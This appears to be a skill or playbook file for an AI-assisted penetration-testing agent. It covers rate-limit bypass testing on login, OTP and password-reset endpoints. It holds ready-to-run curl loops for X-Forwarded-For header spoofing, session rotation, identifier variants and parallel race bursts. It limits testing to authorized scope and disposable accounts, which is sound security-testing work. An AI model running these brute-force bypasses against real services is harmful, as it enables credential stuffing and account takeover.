---
name: rate-limiting
description: >
  Hunt for rate-limiting bypass: header rotation (X-Forwarded-For spoofing),
  IP rotation, distributed/parallel request fan-out, and race-condition
  windows around the limiter's check-then-increment logic. Use on login,
  OTP/2FA, password reset, coupon redemption, or any endpoint that should
  be throttled. Keywords: rate limit, brute force, X-Forwarded-For, IP
  rotation, race condition, 429, Retry-After.
  Do NOT use this skill as the primary vector for business-logic race
  conditions unrelated to throttling (e.g. coupon double-redeem logic
  itself) — that root cause belongs in business-logic; this skill is
  about whether/how the rate limiter itself can be bypassed.
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-307, CWE-799, CWE-362]
  mitre_attack: [T1110, T1499]
  tools: [burpsuite, "Turbo Intruder", curl, ffuf]
depends_on: [active-recon, web-crawling]
feeds_into: [chain-analysis]
chains_with: [password-reset, 2fa-bypass, business-logic]
---

## Signals

- Login, OTP/2FA verification, password reset, account lookup, or coupon endpoints with no visible lockout after many attempts.
- `X-Forwarded-For`, `X-Real-IP`, `True-Client-IP`, `CF-Connecting-IP` headers accepted and seemingly trusted for rate-limit keying (test, don't assume).
- Rate limit responses (`429 Too Many Requests`) that reset suspiciously fast, or only apply per-session/per-cookie rather than per-account.
- Any endpoint whose limiter message mentions a specific window ("try again in 60 seconds") — gives you the exact parameter to test around.

## Prerequisites

- A disposable test account (for login/2FA brute-force testing) — never target real user accounts.
- Burp Suite Professional with **Turbo Intruder** for genuine parallel/race testing (standard Intruder is request-at-a-time and won't expose race windows).

## Methodology

1. **Baseline the limiter.** Send sequential requests until you observe the block (429, CAPTCHA, account lockout message) to learn the exact threshold and window:
   ```bash
   for i in $(seq 1 20); do
     curl -s -o /dev/null -w "%{http_code} " -X POST https://target.com/login \
       -d "username=testuser&password=wrong$i"
   done; echo
   ```

2. **Header rotation bypass.** If the limiter might key off client IP via a trusted forwarded header, rotate it per request:
   ```bash
   for i in $(seq 1 30); do
     ip="10.0.$((RANDOM%255)).$((RANDOM%255))"
     curl -s -o /dev/null -w "%{http_code} " -X POST https://target.com/login \
       -H "X-Forwarded-For: $ip" -d "username=testuser&password=wrong$i"
   done; echo
   ```
   Try every header variant individually (apps often trust only one):
   ```bash
   for h in "X-Forwarded-For" "X-Real-IP" "X-Client-IP" "True-Client-IP" "CF-Connecting-IP" "X-Originating-IP"; do
     echo "== $h =="
     for i in $(seq 1 10); do
       curl -s -o /dev/null -w "%{http_code} " -X POST https://target.com/login \
         -H "$h: 10.0.0.$i" -d "username=testuser&password=wrong$i"
     done; echo
   done
   ```

3. **Case/format variation on the identifier itself.** If the limiter keys on the submitted username/email string exactly, test case/whitespace/alias variants that the *backend* would normalize to the same account but the *limiter* might treat as distinct:
   ```bash
   curl -s -o /dev/null -w "%{http_code}\n" -X POST https://target.com/login -d "username=TestUser&password=wrong1"
   curl -s -o /dev/null -w "%{http_code}\n" -X POST https://target.com/login -d "username=testuser&password=wrong2"
   curl -s -o /dev/null -w "%{http_code}\n" -X POST https://target.com/login -d "username=testuser%20&password=wrong3"
   curl -s -o /dev/null -w "%{http_code}\n" -X POST https://target.com/login -d "username=test.user@target.com&password=wrong4"
   curl -s -o /dev/null -w "%{http_code}\n" -X POST https://target.com/login -d "username=testuser+1@target.com&password=wrong5"
   ```

4. **Endpoint/path variation.** If there are multiple paths that hit the same login logic (legacy endpoint, mobile API vs web API, versioned API), check if the limiter is applied inconsistently:
   ```bash
   curl -s -o /dev/null -w "%{http_code}\n" -X POST https://target.com/api/v1/login -d "username=testuser&password=wrong"
   curl -s -o /dev/null -w "%{http_code}\n" -X POST https://target.com/api/v2/login -d "username=testuser&password=wrong"
   curl -s -o /dev/null -w "%{http_code}\n" -X POST https://target.com/mobile-api/auth -d "username=testuser&password=wrong"
   ```

5. **Session/cookie rotation.** If the limiter keys off a session cookie rather than account/IP, discard and re-fetch a fresh session before each attempt:
   ```bash
   for i in $(seq 1 10); do
     jar=$(mktemp)
     curl -s -c "$jar" https://target.com/login > /dev/null
     curl -s -b "$jar" -o /dev/null -w "%{http_code} " -X POST https://target.com/login -d "username=testuser&password=wrong$i"
     rm -f "$jar"
   done; echo
   ```

6. **Race condition in the limiter's own check-then-increment.** Fire many requests in a true single-packet/parallel burst to see if more attempts succeed than the stated limit allows, exploiting a gap between "check counter" and "increment counter":
   ```bash
   # Turbo Intruder: use the examples/race-single-packet-attack.py template,
   # point at the login/OTP endpoint, set concurrentConnections high, requestsPerConnection=1
   ```
   Or a simpler parallel curl approximation (less precise, still useful signal):
   ```bash
   for i in $(seq 1 30); do
     curl -s -o /tmp/rl_$i.txt -w "%{http_code}" https://target.com/api/otp/verify \
       -d "code=123456" -b "session=$SESSION" & 
   done; wait
   grep -c '^200' /tmp/rl_*.txt
   ```

7. **Distributed source simulation (only within explicit scope).** If header spoofing fails and the limiter genuinely tracks real source IP, this step requires actual distributed infrastructure to test meaningfully — flag as a design observation rather than attempting real distributed brute-force unless the engagement explicitly authorizes infrastructure-level testing.

## Tooling

- Burp Suite **Turbo Intruder** (single-packet attack technique — the standard way to get genuine race-condition timing over a single TCP connection/HTTP pipelining).
- `curl` for scripted sequential/header-rotation tests.
- `ffuf -t` with a high thread count as a rougher parallelism test when Turbo Intruder isn't available.

## Root Causes

- Rate limiter keyed on a client-supplied/spoofable header (`X-Forwarded-For`) instead of the actual TCP source or an authenticated account identifier.
- Limiter keyed on session/cookie rather than account, letting an attacker reset the counter by discarding the session.
- Counter increment implemented as separate read-then-write operations without atomicity (e.g. `GET counter` then `SET counter+1` in two round trips to a cache/DB), creating a race window under concurrent load.
- Inconsistent limiter application across equivalent endpoints (legacy/versioned/mobile APIs bypassing the primary one).

## Validation Gate (minimum proof)

- Header rotation/session rotation bypass: a sequential log of attempts and status codes showing the limiter trigger at the expected count under normal conditions, then the same count of attempts succeeding (no 429/lockout) once the bypass technique is applied — the contrast between the two runs is the proof.
- Race condition: exact concurrent-request count sent vs. successful count received (e.g. "30 sent, 4 succeeded" for an action meant to allow 1) with raw tool output/timestamps.
- Never complete a brute-force against a real credential to "prove" account takeover — demonstrate the bypass mechanism against a disposable test account and stop once the limiter is shown to be bypassable.

## Gotchas

- **Minimum proof:** the absence of a 429 after N requests is a necessary but not sufficient signal — confirm the backend is actually processing each attempt as a distinct try (check for a response difference between a correct vs incorrect credential within the burst) rather than being silently deduplicated/cached.
- **Common N/A:** limiter enforced at the infrastructure/WAF layer by genuine source IP with no trusted spoofable header, consistently applied across all equivalent endpoints — header rotation attempts will cleanly fail; don't force a finding.
- **Overclaim trap:** showing header spoofing changes the rate-limit *counter key* doesn't automatically mean brute-force-to-account-takeover is feasible — that also depends on credential/OTP space size (chain with 2fa-bypass/password-reset for the full impact argument).
- Respect the project's 3-retry/budget rules — brute-force-style testing can burn a lot of requests fast; cap test runs deliberately and don't actually attempt to crack a real password/OTP end-to-end without explicit scope for that impact level.
- CAPTCHA appearing after N attempts is a valid control — note if it can itself be bypassed (reused token, client-side-only check) but that's a separate finding, not proof the rate limit is absent.

## Chain Anchors

Before declaring this finding complete, probe these escalation paths:

1. **Credential stuffing feasibility** — With rate limiting absent/bypassed, can you run a realistic credential-stuffing attack against login?
2. **Bypass via header/IP rotation** — Does rotating X-Forwarded-For, IP, or session identifiers bypass the rate limit entirely?
3. **OTP/2FA brute force** — Does the lack of rate limiting allow brute-forcing a short OTP/2FA code within its validity window?
4. **Resource exhaustion chain** — Can unthrottled requests be chained into a resource-exhaustion DoS on a downstream dependency?

A finding without chain anchor results is INCOMPLETE. Record each anchor as
tested/not-applicable/blocked with the reason.

## Chains & Compositions

- Rate-limit bypass on login → feeds credential-stuffing/brute-force impact (quantify the space, don't exhaust a real account).
- Rate-limit bypass on OTP verification → chain fully into 2fa-bypass for the complete bypass writeup.
- Rate-limit bypass on password-reset-request → chain into password-reset (token brute-force becomes feasible if the limiter is bypassed and token entropy is also weak).
- Race-condition-style limiter bypass → same underlying technique as business-logic race conditions; note the overlap but keep the finding scoped to "limiter bypass" here, "business outcome" there.
